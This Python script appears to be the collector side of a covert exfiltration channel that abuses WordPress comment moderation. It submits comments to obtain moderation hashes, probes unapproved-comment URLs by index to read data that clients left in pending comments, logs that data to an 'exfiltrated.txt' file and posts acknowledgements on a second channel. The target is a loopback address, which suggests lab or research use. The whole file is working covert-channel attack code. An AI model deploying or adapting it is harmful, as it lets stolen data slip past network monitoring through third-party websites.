#!/usr/bin/env python3

from wpc2 import *
from bs4 import BeautifulSoup
import urllib.parse
import sys
import datetime

random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))

target_blog = "http://127.0.0.3/"
exfil_channel_id = 5
ack_channel_id = 7
exfil_channel = "2021/08/13/exfil-channel/"
ack_channel = "2021/08/13/ack-channel/"

server_time_slot = 20
client_time_slot = 10

comment_index = 0
prev_unapproved_index = 0

class Client:
    id = ""
    time_slot = ""

def fetch_comments_page(comments_url):
    fetch_comments_command = """
    curl '""" \
    + comments_url + \
    """' \
      -H 'Connection: keep-alive' \
      -H 'Cache-Control: max-age=0' \
      -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
      -H 'sec-ch-ua-mobile: ?1' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36' \
      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
      -H 'Sec-Fetch-Site: none' \
      -H 'Sec-Fetch-Mode: navigate' \
      -H 'Sec-Fetch-User: ?1' \
      -H 'Sec-Fetch-Dest: document' \
      -H 'Accept-Language: en-US,en;q=0.9' \
      --compressed -s
    """
    curl_output = subprocess.check_output(fetch_comments_command, shell=True)
    return curl_output.decode()

def get_current_unapproved_index():
    global comment_index

    random_string = generate_random_string(10)
    comment_to_send = random_string + ": get_current_unapproved_index (" + str(comment_index) + ") "
    response = submit_comment(target_blog, exfil_channel_id, comment_to_send)
    comment_index += 1

    return response.unapproved_index

def get_moderation_hash_at_current_time():
    random_string = generate_random_string(10)
    response = submit_comment(target_blog, exfil_channel_id, random_string + ": Getting_moderation_hash")

    return response.moderation_hash, response.unapproved_index

clients = []
for i in range(1, 4):
    client = Client()
    client.id = str(i)
    clients.append(client)
    print("## Created client with id: " + str(client.id))

if prev_unapproved_index == 0:
    prev_unapproved_index = get_current_unapproved_index()

loop_counter = 99
while(loop_counter > 0):
    print("[INFO] Delaying to client timeslot. " + str(client_time_slot))
    delay_to_timeslot(client_time_slot)
    current_hash, server_index = get_moderation_hash_at_current_time()

    print("[INFO] Current hash is: " + current_hash)
    print("[INFO] Delaying to server timeslot. " + str(server_time_slot))

    delay_to_timeslot(server_time_slot)

    index_client = 0
    processed_unapproved_indexes = []
            
    while index_client < len(clients):
        print("## checking index_client: " + str(index_client))
        
        for index_offset in range(1, len(clients) + 1 + 1):
            print("## prev_unapproved_index: " + str(prev_unapproved_index) + ", index_offset: " + str(index_offset))
            current_unapproved_index = prev_unapproved_index + index_offset
            print("## " + str(current_unapproved_index) + " in? " + str(processed_unapproved_indexes))
            if current_unapproved_index == server_index:
                index_client += 1
                continue
            if current_unapproved_index in processed_unapproved_indexes:
                continue
            
            url = target_blog + exfil_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
            print("[INFO] Checking URL: " + url);

            response_html = fetch_comments_page(url)
            soup = BeautifulSoup(response_html, "html.parser")

            if soup.find("p", class_="comment-awaiting-moderation"):
                elems = soup.find_all("div", class_="comment-content")
                elem = elems[-1]
                if elem and elem.string:
                    exfil_content = str(elem.string).strip()
                    to_write = str(datetime.datetime.utcnow()) + ": "
                    to_write += "Extracted data with timeslot of " + str(client_time_slot) + ": " + exfil_content + "\n"
                    print("[INFO] " + to_write);
                    f = open("../output/exfiltrated.txt", "a")
                    f.write(to_write)
                    f.close()

                    message_id = exfil_content.split(":")[0]
                    print("[INFO] Extracted message_id is " + message_id)
                    submit_comment(target_blog, ack_channel_id, message_id)

                    processed_unapproved_indexes.append(current_unapproved_index)
                    print("## processed_unapproved_indexes: " + str(processed_unapproved_indexes))
                    
                    break
            else:
                print("[INFO] No comment for moderation for " + str(client_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
        index_client += 1

    prev_unapproved_index = get_current_unapproved_index()
    loop_counter -= 1
